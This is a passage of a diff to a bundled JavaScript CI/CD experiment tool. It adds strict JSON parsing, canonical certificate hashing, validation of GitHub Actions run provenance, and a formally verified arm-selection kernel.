+    while (/[ \t\r\n]/.test(text7[at] ?? "") && at < text7.length) at += 1;
+  };
+  const string4 = () => {
+    const start2 = at++;
+    while (at < text7.length) {
+      const ch = text7[at++];
+      if (ch === "\\") {
+        at += 1;
+        continue;
+      }
+      if (ch === '"') {
+        const value3 = JSON.parse(text7.slice(start2, at));
+        if (typeof value3 !== "string") throw new Error("Expected a JSON string.");
+        return scalarString(value3);
+      }
+    }
+    throw new Error("Unterminated JSON string.");
+  };
+  const value2 = (depth) => {
+    if (depth > 64) throw new Error("JSON nesting exceeds 64 levels.");
+    whitespace();
+    const ch = text7[at];
+    if (ch === '"') return string4();
+    if (ch === "[" || ch === "{") {
+      const object3 = ch === "{";
+      const end = object3 ? "}" : "]";
+      at += 1;
+      whitespace();
+      const array2 = [];
+      const record5 = /* @__PURE__ */ Object.create(null);
+      const keys = /* @__PURE__ */ new Set();
+      if (text7[at] === end) {
+        at += 1;
+        return object3 ? record5 : array2;
+      }
+      while (at < text7.length) {
+        whitespace();
+        if (object3) {
+          if (text7[at] !== '"') throw new Error("Expected a JSON object key.");
+          const key2 = string4();
+          if (keys.has(key2)) throw new Error(`Duplicate JSON key: ${key2}`);
+          keys.add(key2);
+          whitespace();
+          if (text7[at++] !== ":") throw new Error("Expected ':' after JSON key.");
+          record5[key2] = value2(depth + 1);
+        } else array2.push(value2(depth + 1));
+        whitespace();
+        if (text7[at] === end) {
+          at += 1;
+          return object3 ? record5 : array2;
+        }
+        if (text7[at++] !== ",") throw new Error("Expected ',' in JSON container.");
+      }
+      throw new Error("Unterminated JSON container.");
+    }
+    for (const [token2, result] of [["true", true], ["false", false], ["null", null]]) {
+      if (text7.startsWith(token2, at)) {
+        at += token2.length;
+        return result;
+      }
+    }
+    const token = /^-?(?:0|[1-9]\d*)(?:\.\d+)?(?:[eE][+-]?\d+)?/.exec(text7.slice(at))?.[0];
+    if (!token || token.length > 128) throw new Error("Invalid JSON value.");
+    at += token.length;
+    const number3 = Number(token);
+    if (!Number.isFinite(number3) || Object.is(number3, -0) || Math.abs(number3) > Number.MAX_SAFE_INTEGER || !fractions && !Number.isSafeInteger(number3) || !new BigNumber(token).eq(new BigNumber(number3))) {
+      throw new Error("Invalid or non-round-trippable JSON number.");
+    }
+    return number3;
+  };
+  const parsed = value2(0);
+  whitespace();
+  if (at !== text7.length) throw new Error("Trailing JSON input.");
+  return parsed;
+}
+function canonicalJson(input2) {
+  const ancestors2 = /* @__PURE__ */ new Set();
+  const visit4 = (value2, depth) => {
+    if (depth > 64) throw new Error("Canonical JSON nesting exceeds 64 levels.");
+    if (value2 === null) return "null";
+    if (typeof value2 === "boolean") return value2 ? "true" : "false";
+    if (typeof value2 === "number") {
+      if (!Number.isSafeInteger(value2) || Object.is(value2, -0)) throw new Error("Certificates require safe integer numbers.");
+      return String(value2);
+    }
+    if (typeof value2 === "string") return JSON.stringify(scalarString(value2));
+    if (typeof value2 !== "object" || ancestors2.has(value2)) throw new Error("Invalid canonical JSON value.");
+    ancestors2.add(value2);
+    let result;
+    if (Array.isArray(value2)) {
+      const descriptors = Object.getOwnPropertyDescriptors(value2);
+      if (Object.keys(descriptors).length !== value2.length + 1 || Object.getOwnPropertySymbols(value2).length) throw new Error("Sparse or decorated array.");
+      const items2 = [];
+      for (let i = 0; i < value2.length; i += 1) {
+        const descriptor = descriptors[String(i)];
+        if (!descriptor || !descriptor.enumerable || !("value" in descriptor)) throw new Error("Sparse or accessor array.");
+        items2.push(visit4(descriptor.value, depth + 1));
+      }
+      result = `[${items2.join(",")}]`;
+    } else {
+      if (Object.getPrototypeOf(value2) !== Object.prototype && Object.getPrototypeOf(value2) !== null) throw new Error("Expected a plain JSON object.");
+      if (Object.getOwnPropertySymbols(value2).length) throw new Error("Symbol keys are not JSON.");
+      const descriptors = Object.getOwnPropertyDescriptors(value2);
+      result = `{${Object.keys(descriptors).sort().map((key2) => {
+        const descriptor = descriptors[key2];
+        if (!descriptor || !descriptor.enumerable || !("value" in descriptor)) throw new Error("Accessors and hidden keys are not JSON.");
+        return `${JSON.stringify(scalarString(key2))}:${visit4(descriptor.value, depth + 1)}`;
+      }).join(",")}}`;
+    }
+    ancestors2.delete(value2);
+    return result;
+  };
+  return visit4(input2, 0);
+}
+var sha256 = (text7) => createHash2("sha256").update(text7).digest("hex");
+var certificateDigest = (unsigned) => sha256(`cicd-optimizer/cert-v1\0${canonicalJson(unsigned)}`);
+function object(value2, label) {
+  if (value2 === null || typeof value2 !== "object" || Array.isArray(value2)) throw new Error(`${label} must be an object.`);
+  return value2;
+}
+function string(value2, label) {
+  if (typeof value2 !== "string") throw new Error(`${label} must be a string.`);
+  return value2;
+}
+function integer(value2, label, min = 0, max2 = Number.MAX_SAFE_INTEGER) {
+  if (typeof value2 !== "number" || !Number.isSafeInteger(value2) || value2 < min || value2 > max2) throw new Error(`${label} must be an integer in [${min}, ${max2}].`);
+  return value2;
+}
+function exactKeys(record5, allowed2, label) {
+  for (const key2 of Object.keys(record5)) if (!allowed2.includes(key2)) throw new Error(`Unknown ${label} field: ${key2}`);
+}
+
+// src/experiments/ci-evidence.ts
+var CI_EVIDENCE_SCHEMA = "cicd-optimizer/ci-evidence-v1";
+function ciProjection(measured, id) {
+  return measured.ci && Object.hasOwn(measured.ci, id) ? measured.ci[id] ?? [] : [];
+}
+var fullGitHubSha = (value2) => typeof value2 === "string" && /^[a-f0-9]{40}$/.test(value2);
+var positiveId = (value2) => Number.isSafeInteger(value2) && value2 > 0;
+var time = (value2) => typeof value2 === "string" ? Date.parse(value2) : NaN;
+var durationSeconds = (start2, end) => {
+  const duration2 = (time(end) - time(start2)) / 1e3;
+  return Number.isFinite(duration2) && duration2 >= 0 && duration2 <= 1e12 ? duration2 : void 0;
+};
+function workflowMatches(sample, workflow) {
+  if (!workflow || !/^\.github\/workflows\/[^/]+\.ya?ml$/.test(sample.workflowPath)) return false;
+  if (/^[1-9]\d*$/.test(workflow)) return String(sample.workflowId) === workflow;
+  return sample.workflowPath === (workflow.startsWith(".github/workflows/") ? workflow : `.github/workflows/${workflow}`);
+}
+function supportedCiSample(sample, spec2, context4) {
+  if (!sample || !positiveId(sample.runId) || !positiveId(sample.workflowId) || sample.event !== "workflow_dispatch" || sample.attempt !== 1 || sample.status !== "completed" || sample.conclusion !== "success" || !fullGitHubSha(context4.headSha) || sample.headSha !== context4.headSha || sample.branch !== context4.branch || !workflowMatches(sample, spec2.workflow)) return false;
+  const created = time(sample.createdAt);
+  const started = time(sample.startedAt);
+  const updated = time(sample.updatedAt);
+  const since = time(context4.since);
+  if (![created, started, updated, since].every(Number.isFinite) || created < since || started < created || updated < started) return false;
+  let seconds2;
+  if (spec2.job) {
+    const job = sample.job;
+    if (!job || !positiveId(job.id) || job.name !== spec2.job || job.conclusion !== "success" || time(job.startedAt) < started || time(job.completedAt) > updated) return false;
+    seconds2 = durationSeconds(job.startedAt, job.completedAt);
+  } else {
+    if (sample.job !== void 0) return false;
+    seconds2 = durationSeconds(sample.startedAt, sample.updatedAt);
+  }
+  return seconds2 !== void 0 && sample.seconds === seconds2;
+}
+function validatedCiSeries(spec2, measured, context4) {
+  const unavailable = (issue) => ({ values: [], runIds: [], issue });
+  const evidence2 = measured.ciEvidence && Object.hasOwn(measured.ciEvidence, spec2.id) ? measured.ciEvidence[spec2.id] : void 0;
+  if (!evidence2) return unavailable(`${spec2.id} requires provenance-backed first-attempt workflow_dispatch samples; recollect legacy evidence`);
+  if (evidence2.schema !== CI_EVIDENCE_SCHEMA || typeof evidence2.repository !== "string" || !/^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/.test(evidence2.repository) || evidence2.workflow !== spec2.workflow || !Array.isArray(evidence2.samples) || evidence2.samples.length > 1e4) {
+    return unavailable(`${spec2.id} has unsupported CI evidence metadata`);
+  }
+  const samples = Array.from(evidence2.samples);
+  if (!samples.every((sample) => supportedCiSample(sample, spec2, { ...context4, ...measured.headSha ? { headSha: measured.headSha } : {} }))) {
+    return unavailable(`${spec2.id} has unsupported, stale-head, PR, retry or inconsistent CI observations`);
+  }
+  const runIds = samples.map((sample) => sample.runId);
+  if (new Set(runIds).size !== samples.length) return unavailable(`${spec2.id} repeats a CI run instead of providing distinct observations`);
+  const values2 = samples.map((sample) => sample.seconds);
+  const projection = ciProjection(measured, spec2.id);
+  if (projection.length !== values2.length || !values2.every((value2, index) => value2 === projection[index])) {
+    return unavailable(`${spec2.id} duration values do not match their recorded run provenance`);
+  }
+  const cohorts = new Set(samples.map((sample) => `${evidence2.repository.toLowerCase()}\0${sample.workflowId}\0${sample.workflowPath}`));
+  if (cohorts.size > 1) return unavailable(`${spec2.id} mixes workflow identities`);
+  const cohort = cohorts.values().next().value;
+  return { values: values2, runIds, ...cohort === void 0 ? {} : { cohort } };
+}
+function decodeCiEvidence(value2) {
+  const series = object(value2, "ciEvidence");
+  if (Object.keys(series).length > 128) throw new Error("At most 128 CI evidence series.");
+  return Object.fromEntries(Object.entries(series).map(([id, input2]) => {
+    const record5 = object(input2, `ciEvidence.${id}`);
+    exactKeys(record5, ["schema", "repository", "workflow", "samples"], "CI evidence");
+    if (record5.schema !== CI_EVIDENCE_SCHEMA) throw new Error("Unsupported CI evidence schema.");
+    if (!Array.isArray(record5.samples) || record5.samples.length > 1e4) throw new Error("At most 10000 CI observations per series.");
+    const evidence2 = {
+      schema: CI_EVIDENCE_SCHEMA,
+      repository: string(record5.repository, "repository"),
+      workflow: string(record5.workflow, "workflow"),
+      samples: record5.samples.map((input3) => {
+        const row = object(input3, "CI observation");
+        exactKeys(row, ["runId", "attempt", "workflowId", "workflowPath", "event", "status", "conclusion", "headSha", "branch", "createdAt", "startedAt", "updatedAt", "seconds", "job"], "CI observation");
+        if (typeof row.seconds !== "number" || !Number.isFinite(row.seconds) || row.seconds < 0 || row.seconds > 1e12) throw new Error("Invalid CI observation duration.");
+        const sample = {
+          runId: integer(row.runId, "runId", 1),
+          attempt: integer(row.attempt, "attempt", 1),
+          workflowId: integer(row.workflowId, "workflowId", 1),
+          workflowPath: string(row.workflowPath, "workflowPath"),
+          event: string(row.event, "event"),
+          status: string(row.status, "status"),
+          conclusion: string(row.conclusion, "conclusion"),
+          headSha: string(row.headSha, "headSha"),
+          branch: string(row.branch, "branch"),
+          createdAt: string(row.createdAt, "createdAt"),
+          startedAt: string(row.startedAt, "startedAt"),
+          updatedAt: string(row.updatedAt, "updatedAt"),
+          seconds: row.seconds
+        };
+        if (row.job !== void 0) {
+          const job = object(row.job, "CI job");
+          exactKeys(job, ["id", "name", "startedAt", "completedAt", "conclusion"], "CI job");
+          sample.job = {
+            id: integer(job.id, "job.id", 1),
+            name: string(job.name, "job.name"),
+            startedAt: string(job.startedAt, "job.startedAt"),
+            completedAt: string(job.completedAt, "job.completedAt"),
+            conclusion: string(job.conclusion, "job.conclusion")
+          };
+        }
+        return sample;
+      })
+    };
+    return [id, evidence2];
+  }));
 }
 
 // src/experiments/manifest.ts
@@ -33908,9 +40660,9 @@ function validateManifest(input2, options = {}) {
   }
   return v.problems.length === 0 ? { manifest, problems: [] } : { problems: v.problems };
 }
-function parseManifest2(text6, options = {}) {
+function parseManifest2(text7, options = {}) {
   try {
-    return validateManifest((0, import_yaml41.parse)(text6), options);
+    return validateManifest((0, import_yaml41.parse)(text7), options);
   } catch (error2) {
     return { problems: [{ path: "experiment.yml", message: error2.message }] };
   }
@@ -33937,169 +40689,70 @@ function renderRubric(rubric) {
 
 // src/experiments/score.ts
 init_stats();
-var EPSILON = 1e-9;
-var clamp = (value2) => Math.max(-1, Math.min(1, value2));
-var round = (value2) => Math.round(value2 * 1e4) / 1e4;
-function metricsFor(manifest, config) {
-  if (manifest.metrics?.length) return config.metrics.filter((spec2) => manifest.metrics?.includes(spec2.id));
-  const source = manifest.kind === "rules" ? "corpus" : "ci";
-  return config.metrics.filter((spec2) => spec2.source === source);
-}
-function relativeDelta(spec2, control, arm) {
-  const change = spec2.direction === "maximize" ? arm - control : control - arm;
-  if (Math.abs(control) < EPSILON) return change === 0 ? 0 : clamp(Math.sign(change));
-  return clamp(change / Math.abs(control));
-}
-function compare(spec2, control, arm, config) {
-  const base2 = { id: spec2.id, weight: spec2.weight, direction: spec2.direction, delta: 0 };
-  if (spec2.source === "corpus") {
-    const c3 = control.corpus?.[spec2.id];
-    const a2 = arm.corpus?.[spec2.id];
-    if (c3 === void 0 || a2 === void 0) return base2;
-    return { ...base2, control: c3, arm: a2, delta: round(relativeDelta(spec2, c3, a2)) };
-  }
-  const cSamples = control.ci?.[spec2.id] ?? [];
-  const aSamples = arm.ci?.[spec2.id] ?? [];
-  const minSamples = config.selection.minSamples;
-  if (cSamples.length < minSamples || aSamples.length < minSamples) {
-    return { ...base2, needs: { control: Math.max(0, minSamples - cSamples.length), arm: Math.max(0, minSamples - aSamples.length) } };
-  }
-  const c2 = median(cSamples);
-  const a = median(aSamples);
-  const delta = relativeDelta(spec2, c2, a);
-  const better = delta > 0;
-  const [high, low] = spec2.direction === "minimize" === better ? [cSamples, aSamples] : [aSamples, cSamples];
-  const pValue = mannWhitneyGreater(high, low).pValue;
-  const significant = delta !== 0 && pValue < config.selection.pValue;
-  return { ...base2, control: c2, arm: a, pValue: round(pValue), delta: significant ? round(delta) : 0 };
-}
-function scoreArm(manifest, control, arm, config) {
-  const specs = metricsFor(manifest, config);
-  const metrics = specs.map((spec2) => compare(spec2, control, arm, config));
-  const pending = [];
-  const failures = [];
-  if (arm.error) failures.push(`evaluation failed: ${arm.error}`);
-  if (control.error) failures.push(`control evaluation failed: ${control.error}`);
-  if (arm.testsPassed === false) failures.push("checks failed");
-  if (arm.testsPassed === void 0 && !arm.error) pending.push("checks are still running");
-  const touched = arm.changedPaths.filter((path) => config.protectedPaths.some((glob) => matchesGlob(path, glob)));
-  if (touched.length > 0) failures.push(`modified protected paths: ${touched.join(", ")}`);
-  for (const metric of metrics) {
-    const spec2 = specs.find((candidate) => candidate.id === metric.id);
-    if (metric.needs && (metric.needs.arm > 0 || metric.needs.control > 0)) pending.push(`${metric.id} needs more CI samples`);
-    else if (metric.control === void 0 || metric.arm === void 0) {
-      if (!arm.error && !control.error) pending.push(`${metric.id} has not been measured`);
-    } else if (spec2?.maxRegression !== void 0 && metric.delta < -spec2.maxRegression) {
-      failures.push(`${metric.id} regressed ${Math.round(-metric.delta * 100)}% (limit ${Math.round(spec2.maxRegression * 100)}%)`);
-    }
-  }
-  const totalWeight = metrics.reduce((sum, metric) => sum + metric.weight, 0) || 1;
-  const deterministic = round(metrics.reduce((sum, metric) => sum + metric.weight * metric.delta, 0) / totalWeight);
-  const cap = Math.max(0, Math.min(0.5, config.selection.judgeWeight));
-  const judge = arm.judge ? Math.max(0, Math.min(1, arm.judge.score)) : void 0;
-  const rank2 = round(judge === void 0 ? deterministic : (1 - cap) * deterministic + cap * (2 * judge - 1));
-  return {
-    arm: arm.arm,
-    metrics,
-    deterministic,
-    rank: rank2,
-    pending,
-    failures,
-    qualifies: failures.length === 0 && pending.length === 0 && deterministic >= config.selection.minImprovement
-  };
-}
 
-// src/experiments/collect.ts
-var seconds2 = (start2, end) => {
-  const value2 = (Date.parse(end ?? "") - Date.parse(start2 ?? "")) / 1e3;
-  return Number.isFinite(value2) && value2 >= 0 ? value2 : void 0;
-};
-async function ciSamples(client, repo, spec2, options) {
-  if (!spec2.workflow) return [];
-  const response = await client.request("GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/runs", {
-    ...repo,
-    workflow_id: spec2.workflow,
-    branch: options.branch,
-    status: "success",
-    created: `>=${options.since.slice(0, 10)}`,
-    per_page: 100
-  });
-  const runs = (response.data.workflow_runs ?? []).filter((run4) => !options.headSha || run4.head_sha === options.headSha).slice(0, options.maxRuns ?? 30);
-  const samples = [];
-  for (const run4 of runs) {
-    if (!spec2.job) {
-      const value3 = seconds2(run4.run_started_at ?? run4.created_at, run4.updated_at);
-      if (value3 !== void 0) samples.push(value3);
-      continue;
-    }
-    const response2 = await client.request("GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs", { ...repo, run_id: run4.id, per_page: 100 }).catch(() => void 0);
-    const list3 = response2?.data?.jobs ?? [];
-    const job = list3.find((candidate) => candidate.name === spec2.job && candidate.conclusion === "success");
-    const value2 = job ? seconds2(job.started_at, job.completed_at) : void 0;
-    if (value2 !== void 0) samples.push(value2);
-  }
-  return samples;
+// src/formal/selection.ts
+var OBJECTIVE_SCALE = 1e4;
+var WEIGHT_SCALE = 1e6;
+function integer2(value2) {
+  if (!Number.isSafeInteger(value2)) throw new Error("Formal kernel inputs must be safe integers.");
+  return new BigNumber(value2);
 }
-var FAILED = /* @__PURE__ */ new Set(["failure", "cancelled", "timed_out", "action_required", "startup_failure", "stale"]);
-async function checksPassed(client, repo, sha) {
-  const response = await client.request("GET /repos/{owner}/{repo}/commits/{ref}/check-runs", { ...repo, ref: sha, per_page: 100 });
-  const runs = response.data.check_runs ?? [];
-  if (runs.length === 0) return void 0;
-  if (runs.some((run4) => run4.conclusion && FAILED.has(run4.conclusion))) return false;
-  if (runs.some((run4) => run4.status !== "completed")) return void 0;
-  return true;
+function quantize(value2, scale = OBJECTIVE_SCALE, rounding = BigNumber.ROUND_HALF_CEIL) {
+  if (!Number.isFinite(value2)) throw new Error("Cannot quantize a non-finite value.");
+  if (!Number.isSafeInteger(scale) || scale <= 0) throw new Error("Quantization scale must be a positive safe integer.");
+  const result = new BigNumber(value2).times(scale).integerValue(rounding).toNumber();
+  if (!Number.isSafeInteger(result)) throw new Error("Quantized value exceeds the adapter's safe-integer bound.");
+  return result === 0 ? 0 : result;
 }
-async function changedPaths(client, repo, base2, head) {
-  const response = await client.request("GET /repos/{owner}/{repo}/compare/{basehead}", { ...repo, basehead: `${base2}...${head}`, per_page: 300 });
-  return (response.data.files ?? []).flatMap(
-    (file) => file.previous_filename ? [file.filename, file.previous_filename] : [file.filename]
+function encode2(candidate) {
+  if (candidate.metrics.length > 128) throw new Error("At most 128 metrics per candidate.");
+  if ([candidate.armError, candidate.controlError, candidate.protectedPath, candidate.invalid, ...candidate.metrics.map((metric) => metric.measured)].some((value2) => typeof value2 !== "boolean")) throw new Error("Formal kernel flags must be booleans.");
+  return Selection.Candidate.create_Candidate(
+    _dafny.Seq.of(...candidate.metrics.map((metric) => Selection.Metric.create_Metric(
+      integer2(metric.delta),
+      integer2(metric.weight),
+      metric.measured,
+      integer2(metric.regressionLimit)
+    ))),
+    integer2(candidate.tests),
+    integer2(candidate.controlTests),
+    candidate.armError,
+    candidate.controlError,
+    candidate.protectedPath,
+    candidate.invalid,
+    integer2(candidate.judge)
   );
 }
-async function collectMeasurements(client, repo, options) {
-  const { manifest, state, config } = options;
-  const ciSpecs = metricsFor(manifest, config).filter((spec2) => spec2.source === "ci");
-  const trunk = trunkBranch(manifest.name);
-  const measure = async (branch, arm, headSha, pullRequest) => {
-    const measurement = { arm, changedPaths: [], ...headSha ? { headSha } : {}, ...pullRequest ? { pullRequest } : {} };
-    try {
-      if (ciSpecs.length > 0) {
-        measurement.ci = {};
-        for (const spec2 of ciSpecs) {
-          measurement.ci[spec2.id] = await ciSamples(client, repo, spec2, { branch, since: manifest.createdAt, ...headSha ? { headSha } : {} });
-        }
-      }
-      if (arm !== "trunk" && headSha) {
-        measurement.changedPaths = await changedPaths(client, repo, state.trunk?.headSha ?? trunk, headSha);
-        const passed = await checksPassed(client, repo, headSha);
-        if (passed !== void 0) measurement.testsPassed = passed;
-      } else {
-        measurement.testsPassed = true;
-      }
-    } catch (error2) {
-      measurement.error = error2.message;
-    }
-    return measurement;
-  };
-  const control = await measure(trunk, "trunk", state.trunk?.headSha, state.trunk?.number);
-  const arms = [];
-  for (const spec2 of manifest.arms) {
-    const pull = state.arms.find((candidate) => candidate.arm === spec2.name && candidate.state === "open");
-    if (pull) arms.push(await measure(armBranch(manifest.name, spec2.name), spec2.name, pull.headSha, pull.number));
-  }
-  return { experiment: manifest.name, collectedAt: (options.now ?? /* @__PURE__ */ new Date()).toISOString(), control, arms };
-}
-function mergeMeasurement(measurements, update2) {
-  const apply = (branch) => {
-    const merged = { ...branch, ...update2, changedPaths: update2.changedPaths ?? branch.changedPaths };
-    if (branch.testsPassed === false || update2.testsPassed === false) merged.testsPassed = false;
-    return merged;
-  };
-  if (update2.arm === "trunk") return { ...measurements, control: apply(measurements.control) };
-  const exists = measurements.arms.some((arm) => arm.arm === update2.arm);
+function evaluateCandidate(candidate, minimum, influence) {
+  const score = Selection.__default.Evaluate(encode2(candidate), integer2(minimum), integer2(influence));
   return {
-    ...measurements,
-    arms: exists ? measurements.arms.map((arm) => arm.arm === update2.arm ? apply(arm) : arm) : [...measurements.arms, { changedPaths: [], ...update2 }]
+    deterministic: score.dtor_deterministic.toNumber(),
+    rank: score.dtor_rank.toNumber(),
+    failed: score.dtor_failed,
+    pending: score.dtor_pending,
+    eligible: score.dtor_eligible
   };
+}
+function reduceCandidates(candidates2, minimum, influence, running, expired) {
+  if (candidates2.length > 64) throw new Error("At most 64 candidates in the declared finite universe.");
+  if (typeof running !== "boolean" || typeof expired !== "boolean") throw new Error("Reducer state flags must be booleans.");
+  const result = Selection.__default.Reduce(
+    _dafny.Seq.of(...candidates2.map(encode2)),
+    integer2(minimum),
+    integer2(influence),
+    running,
+    expired
+  );
+  if (result.is_Promote) {
+    const index = result.dtor_index.toNumber();
+    if (!Number.isSafeInteger(index) || index < 0 || index >= candidates2.length) throw new Error("Generated winner is outside the candidate universe.");
+    return { action: "promote", index };
+  }
+  if (result.is_Skip) return { action: "skip" };
+  if (result.is_Wait) return { action: "wait" };
+  if (result.is_Reject) return { action: "reject" };
+  if (result.is_Expire) return { action: "expire" };
+  throw new Error("Unexpected generated reducer result.");
 }
 
 // src/experiments/config.ts
@@ -34175,6 +40828,15 @@ function validateHillClimbConfig(input2) {
       });
     }
   }
+  if (metrics.length > 128) v.problem("metrics", "At most 128 metrics.");
+  if (new Set(metrics.map((metric) => metric.id)).size !== metrics.length) v.problem("metrics", "Metric ids must be unique.");
+  if (!metrics.some((metric) => metric.weight > 0)) v.problem("metrics", "At least one metric weight must be positive.");
+  for (const [index, metric] of metrics.entries()) {
+    if (metric.weight > 1e6 || !new BigNumber(metric.weight).times(1e6).isInteger()) {
+      v.problem(`metrics[${index}].weight`, "Use a weight <= 1000000 with at most six decimal places.");
+    }
+    if (metric.maxRegression !== void 0 && metric.maxRegression > 1) v.problem(`metrics[${index}].maxRegression`, "Expected a fraction between 0 and 1.");
+  }
   const selectionRaw = v.record("selection", root.selection);
   v.unknownKeys("selection", selectionRaw, Object.keys(defaults.selection));
   const s = defaults.selection;
@@ -34187,8 +40849,12 @@ function validateHillClimbConfig(input2) {
     maxConcurrent: v.number("selection.maxConcurrent", selectionRaw.maxConcurrent, s.maxConcurrent, 1),
     maxArms: v.number("selection.maxArms", selectionRaw.maxArms, s.maxArms, 1)
   };
-  if (selection.judgeWeight > 0.5) v.problem("selection.judgeWeight", "Keep the judge weight at or below 0.5 so measurements dominate.");
-  if (selection.pValue >= 1) v.problem("selection.pValue", "Expected a probability below 1.");
+  if (selection.judgeWeight > 0.5) v.problem("selection.judgeWeight", "Use a judge influence between 0 and 0.5.");
+  if (selection.pValue <= 0 || selection.pValue >= 1) v.problem("selection.pValue", "Expected a probability strictly between 0 and 1.");
+  if (selection.minImprovement > 1) v.problem("selection.minImprovement", "Expected a fraction between 0 and 1.");
+  for (const [key2, maximum] of [["minSamples", 1e4], ["maxArms", 64], ["maxConcurrent", 64], ["maxAgeDays", 3650]]) {
+    if (!Number.isInteger(selection[key2]) || selection[key2] > maximum) v.problem(`selection.${key2}`, `Expected an integer <= ${maximum}.`);
+  }
   const promotionRaw = v.record("promotion", root.promotion);
   v.unknownKeys("promotion", promotionRaw, Object.keys(defaults.promotion));
   const promotion = {
@@ -34212,14 +40878,340 @@ function validateHillClimbConfig(input2) {
     problems: v.problems
   };
 }
-function parseHillClimbConfig(text6) {
-  if (text6 === void 0) return { config: structuredClone(DEFAULT_HILL_CLIMB_CONFIG), problems: [] };
+function parseHillClimbConfig(text7) {
+  if (text7 === void 0) return { config: structuredClone(DEFAULT_HILL_CLIMB_CONFIG), problems: [] };
   try {
-    const raw = (0, import_yaml42.parse)(text6);
+    const raw = (0, import_yaml42.parse)(text7);
     return validateHillClimbConfig(raw ?? {});
   } catch (error2) {
     return { config: structuredClone(DEFAULT_HILL_CLIMB_CONFIG), problems: [{ path: HILL_CLIMB_CONFIG_PATH, message: error2.message }] };
   }
+}
+
+// src/experiments/score.ts
+var EPSILON = 1e-9;
+var clamp = (value2) => Math.max(-1, Math.min(1, value2));
+var round = (value2) => quantize(value2) / OBJECTIVE_SCALE;
+var finite = (value2, maximum) => Number.isFinite(value2) && value2 >= 0 && value2 <= maximum;
+function selectionParameters(config) {
+  return {
+    minimum: finite(config.selection.minImprovement, 1) ? quantize(config.selection.minImprovement, OBJECTIVE_SCALE, BigNumber.ROUND_CEIL) : 0,
+    influence: finite(config.selection.judgeWeight, 0.5) ? quantize(config.selection.judgeWeight) : 0
+  };
+}
+function metricsFor(manifest, config) {
+  if (manifest.metrics?.length) return config.metrics.filter((spec2) => manifest.metrics?.includes(spec2.id));
+  const source = manifest.kind === "rules" ? "corpus" : "ci";
+  return config.metrics.filter((spec2) => spec2.source === source);
+}
+function relativeDelta(spec2, control, arm) {
+  const change = spec2.direction === "maximize" ? arm - control : control - arm;
+  if (Math.abs(control) < EPSILON) return change === 0 ? 0 : clamp(Math.sign(change));
+  return clamp(change / Math.abs(control));
+}
+function corpusValue(metrics, id) {
+  switch (id) {
+    case "precision":
+      return metrics?.precision;
+    case "recall":
+      return metrics?.recall;
+    case "f1":
+      return metrics?.f1;
+    case "fixRate":
+      return metrics?.fixRate;
+    case "durationMs":
+      return metrics?.durationMs;
+    default:
+      return void 0;
+  }
+}
+function compare2(spec2, control, arm, config, manifest) {
+  const base2 = { id: spec2.id, weight: finite(spec2.weight, 1e6) ? spec2.weight : 0, direction: spec2.direction, delta: 0 };
+  if (spec2.source === "corpus") {
+    const c3 = corpusValue(control.corpus, spec2.id);
+    const a2 = corpusValue(arm.corpus, spec2.id);
+    if (c3 === void 0 || a2 === void 0) return base2;
+    const maximum = spec2.id === "durationMs" ? 1e12 : 1;
+    if (!finite(c3, maximum) || !finite(a2, maximum)) return { ...base2, error: `${spec2.id} contains an invalid measurement` };
+    return { ...base2, control: c3, arm: a2, delta: round(relativeDelta(spec2, c3, a2)) };
+  }
+  if (![ciProjection(control, spec2.id), ciProjection(arm, spec2.id)].every((samples) => Array.isArray(samples) && samples.length <= 1e4 && Array.from(samples).every((sample) => finite(sample, 1e12)))) {
+    return { ...base2, error: `${spec2.id} contains invalid CI samples` };
+  }
+  const cEvidence = validatedCiSeries(spec2, control, { branch: trunkBranch(manifest.name), since: manifest.createdAt });
+  const aEvidence = validatedCiSeries(spec2, arm, { branch: armBranch(manifest.name, arm.arm), since: manifest.createdAt });
+  const cSamples = cEvidence.values;
+  const aSamples = aEvidence.values;
+  const minSamples = config.selection.minSamples;
+  if (!Number.isInteger(minSamples) || minSamples < 2 || minSamples > 1e4 || !finite(config.selection.pValue, 1)) {
+    return { ...base2, error: "invalid sampling policy" };
+  }
+  const controlRuns = new Set(cEvidence.runIds);
+  if (cEvidence.cohort && aEvidence.cohort && cEvidence.cohort !== aEvidence.cohort || aEvidence.runIds.some((id) => controlRuns.has(id))) {
+    return { ...base2, needs: { control: minSamples, arm: minSamples }, evidenceIssue: `${spec2.id} mixes repositories/workflow identities or reuses the control's runs` };
+  }
+  if (cSamples.length < minSamples || aSamples.length < minSamples) {
+    const issue = cEvidence.issue ?? aEvidence.issue;
+    return { ...base2, needs: { control: Math.max(0, minSamples - cSamples.length), arm: Math.max(0, minSamples - aSamples.length) }, ...issue ? { evidenceIssue: issue } : {} };
+  }
+  const c2 = median(cSamples);
+  const a = median(aSamples);
+  const delta = relativeDelta(spec2, c2, a);
+  const better = delta > 0;
+  const [high, low] = spec2.direction === "minimize" === better ? [cSamples, aSamples] : [aSamples, cSamples];
+  const pValue = mannWhitneyGreater(high, low).pValue;
+  if (!finite(pValue, 1)) return { ...base2, error: `${spec2.id} produced an invalid p-value` };
+  const significant = delta !== 0 && pValue < config.selection.pValue;
+  return { ...base2, control: c2, arm: a, pValue: round(pValue), delta: significant ? round(delta) : 0 };
+}
+function evaluateArm(manifest, control, arm, config) {
+  const specs = metricsFor(manifest, config);
+  const metrics = specs.map((spec2) => compare2(spec2, control, arm, config, manifest));
+  const pending = [];
+  const failures = [];
+  const configProblems = validateHillClimbConfig(config).problems;
+  const invalidMetrics = specs.length === 0 || !specs.some((spec2) => spec2.weight > 0);
+  const invalidMetricSelection = manifest.metrics !== void 0 && (new Set(manifest.metrics).size !== manifest.metrics.length || manifest.metrics.some((id) => !config.metrics.some((spec2) => spec2.id === id)));
+  const invalidJudge = arm.judge !== void 0 && !finite(arm.judge.score, 1);
+  const invalidChecks = [arm.testsPassed, control.testsPassed].some((value2) => value2 !== void 0 && typeof value2 !== "boolean");
+  if (configProblems.length > 0) failures.push(`invalid scoring configuration: ${configProblems.map((problem) => `${problem.path}: ${problem.message}`).join("; ")}`);
+  if (invalidMetrics) failures.push("no positively weighted metrics in the selected universe");
+  if (invalidMetricSelection) {
+    failures.push("manifest selects duplicate or unknown metrics");
+  }
+  if (arm.error !== void 0) failures.push(`evaluation failed: ${arm.error}`);
+  if (control.error !== void 0) failures.push(`control evaluation failed: ${control.error}`);
+  if (arm.testsPassed === false) failures.push("checks failed");
+  if (control.testsPassed === false) failures.push("control checks failed");
+  if (arm.testsPassed === void 0 && arm.error === void 0) pending.push("checks are still running");
